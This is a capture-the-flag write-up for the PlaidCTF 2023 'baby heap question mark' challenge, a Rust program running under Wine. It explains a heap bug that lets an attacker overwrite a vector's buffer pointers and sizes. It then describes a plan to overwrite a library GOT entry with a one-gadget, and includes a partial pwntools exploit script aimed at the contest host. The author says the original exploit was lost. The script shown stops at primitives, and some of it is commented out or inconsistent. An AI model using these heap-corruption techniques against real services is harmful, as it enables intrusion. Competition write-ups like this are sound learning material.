# baby heap question mark

Solved by: @disconnect3d

Task description:  
```  
?!!?!??? ?!!!?!?? ?!!!?!?? ?!!!???? ?!!!??!! ??!!!?!? ??!?!!!!  
??!?!!!! ?!!!!??! ?!!?!!!! ?!!!?!?! ?!!!?!?? ?!!!?!?! ??!?!!!?  
?!!???!? ?!!??!?! ??!?!!!! ?!!??!?? ?!?!???! ?!!!?!!! ??!!?!??  
?!!!?!!! ??!!!??! ?!?!?!!! ?!!??!!! ?!?!!??? ?!!???!! ?!?!???!  
Note: the host machine (that be runnin' the Docker) is a Debian 10 instance,
with the 4.19.0-23-amd64 kernel.  
It be spinnin' things up using xinetd.

Reward: 200

16 solves  
nc bhqm.chal.pwni.ng 1337  
```

File to download:  
* https://plaidctf.com/files/bhqm.84655669eb628529e8cc268207fbe75118f58f0ffe156eb1e2d918d8bb1b5663.tgz

### In the files we got:

```  
$ md5sum *  
e96f325f364bfa90f3217aa177468d64  baby-heap-question-mark.exe  
4f779c49699f33e264754b360935b195  Dockerfile  
fd06aaccacfcb320b98abe3399a3be28  flag  
043d267c15c92f8407c7d5c91c77ef17  getFlag

$ cat Dockerfile  
FROM ubuntu:22.04

RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y wine  
COPY baby-heap-question-mark.exe /baby-heap-question-mark.exe

COPY getFlag /getFlag  
COPY flag /flag  
RUN chmod +s /getFlag  
RUN chmod 400 /flag

RUN useradd -m user  
USER user  
RUN wine nonexistent || true # Just speed up wine execution afterwards

CMD wine /baby-heap-question-mark.exe 2>/dev/null  
```

### The challenge

```  
$ wine ./baby-heap-question-mark.exe

Storage: []  
1. allocate  
2. drop  
3. read  
4. write  
5. quit  
choice?  
```

In the challenge we have a simple CLI that implements a resizeable vector of
buffers.

Each buffer can be allocated with a specific size (option 1; maximum size is
9999), deallocated (option 2), read from (option 3), written to (option 4) and
we can also quit the program.

At first I looked through the binary in IDA Pro, but I quickly noticed it is
written in Rust and it wasn't convenient to do it this way.  
I then started to brute force it by running different operations and I noticed
the bug: when we create multiple buffers of a small size and then drop one of
them and create one big buffer,  
it sometimes gets allocated before the vector allocation (the one that holds
pointers). This then allows us to overwrite the sizes and pointers of the
buffers.

It is also worth to mention that the vector itself is in a contiguous memory
region, can be reallocated and its item layout is:  
```  
u64 size;  
void* buffer_ptr;  
u64 size_duplicated;  
```

For some reason the size is before and after the pointer. No idea why but
that's how it was. I also didn't test if both sizes need to be valid.

Then, if we could overwrite size and pointer we could easily have an arbitrary
read and write primitives.  
We also found out that there are some addresses that pie/aslr doesn't change
which probably all were from Wine.

We also had some troubles: when we had a solution that worked on localhost
(allowed us to overwrite buffer ptr + size) it did not work on remote since we
had a slightly different environment.  
It took us like 1-2h to reproduce the original env and then we found out
another combination of inputs (X alloc + drop + single big alloc + write) to
overwrite the vector contents (buffer ptr+size).

So how did we exploit it? I don't remember it exactly since I did not save the
original exploit which I developed on a VPS that I destroyed just after the
CTF,  
but I went for GOT/PLT in ntdll or other windows library (.dll.so) for which
the address was constant. Iirc we changed 'read' function address somewhere
and pointed it to one gadget.

We tested 3-4 one gadgets and got a win in local (reproduced from remote)
environment and then it also worked on remote.

```py  
#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
# This exploit template was generated via:  
# $ pwn template'--host=bhqm.chal.pwni.ng''--port=1337' ./baby-heap-question-
mark.exe  
from pwn import *  
from binascii import hexlify

# Set up pwntools for the correct architecture  
context.update(arch='i386')  
exe ='./baby-heap-question-mark.exe'

context.newline ='\r\n'

# Many built-in settings can be controlled on the command-line and show up  
# in "args".  For example, to dump all data sent/received, and disable ASLR  
# for all created processes...  
# ./exploit.py DEBUG NOASLR  
# ./exploit.py GDB HOST=example.com PORT=4141  
host = args.HOST or 'bhqm.chal.pwni.ng'  
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if args.GDB:  
       return gdb.debug(['wine', exe] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return process(['wine', exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = connect(host, port)  
   if args.GDB:  
       gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if args.LOCAL:  
       return start_local(argv, *a, **kw)  
   else:  
       return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging  
# GDB will be launched if the exploit is run via e.g.  
# ./exploit.py GDB  
gdbscript ='''  
continue  
'''.format(**locals())

#===========================================================  
#                    EXPLOIT GOES HERE  
#===========================================================

io = start()

if args.REMOTE and not args.HOST:  
   context.newline = b'\n'  
   hashcash = io.recvuntil(b'\n', drop=True)  
   assert hashcash.startswith(b'hashcash -qmb24 ')  
   log.warning("~-~ Solving HashCa$H ~-~")  
   out = subprocess.check_output(hashcash.split(b' '))  
   io.sendline(out[:-1])

def print_storage():  
   s = io.recvuntil(b'Storage: ')  
   print(s + io.recvuntil(b'\n'))

def alloc(size):  
   assert size < 10000, "alloc fail: 10k is max alloc?"  
   io.recvuntil(b'choice?')  
   io.sendline(b'1')  
   io.recvuntil(b'size?')  
   io.sendline(str(size).encode())  
   print_storage()

def drop(idx):  
   io.recvuntil(b'choice?')  
   io.sendline(b'2')  
   io.recvuntil(b'index?')  
   io.sendline(str(idx).encode())  
   print_storage()

def read(idx):  
   io.recvuntil(b'choice?')  
   io.sendline(b'3')  
   io.recvuntil(b'index?')  
   io.sendline(str(idx).encode())  
   io.recvuntil(b'\x1b[?25h\x1b[?25l')  # TODO/FIXME: Some crap we need to
receive first  
   data = io.recvuntil(context.newline, drop=True)  
   #print(data)  
   print_storage()  
   return unhex(data)

def write(idx, data):  
   io.recvuntil(b'choice?')  
   io.sendline(b'4')  
   io.recvuntil(b'index?')  
   io.sendline(str(idx).encode())  
   io.recvuntil(b'data?')  
   io.send(hexlify(data) + b'\n')  
   print_storage()

def quit():  
   io.recvuntil(b'choice?')  
   io.sendline(b'5')

def w(idx, data):  
   alloc(len(data))  
   write(idx, data)

for i in range(4):  
   w(i, bytes([ord('A')+i])*0x20)

#drop(5)

"""  
io.recvuntil(b'choice?')  
io.sendline(b'4')  
io.recvuntil(b'index?')  
io.sendline(str('0').encode())  
io.recvuntil(b'data?')  
"""

x = b''  
for i in range(10):  
   x += p64(0xDEADCAFE+i)

x = bytearray(x)  
idx=0x38  
#x[idx-8:idx] = p64(0x18)  
#x[idx:idx+8] = p64(0x16230)  
#x[idx+8:idx+16] = p64(0x18)  
#x[idx+16:idx+24] = p64(0x20)  # layout fixups...

pause()  
write(0, x)

### TEST ARBWRITE HERE...  
#write(0, b'aaaa')  
#io.interactive()

def arbitrary_write(what, where):  
   assert isinstance(what, int)  
   assert isinstance(where, bytes) and len(where) == 8  
   write(0, p64(what))  
   write(1, where)

def arbitrary_read(what, where):  
   assert isinstance(what, int)  
   assert isinstance(where, bytes) and len(where) == 8  
   write(0, p64(what))  
   read(1, where)

"""  
alloc(10)  
write(0, b'b'*10)  
alloc(10)  
write(0, b'c'*10)  
"""  
io.interactive()  
```  

Original writeup (https://github.com/justcatthefish/ctf-
writeups/tree/master/2023-04-14-PlaidCTF2023/pwn_baby_heap).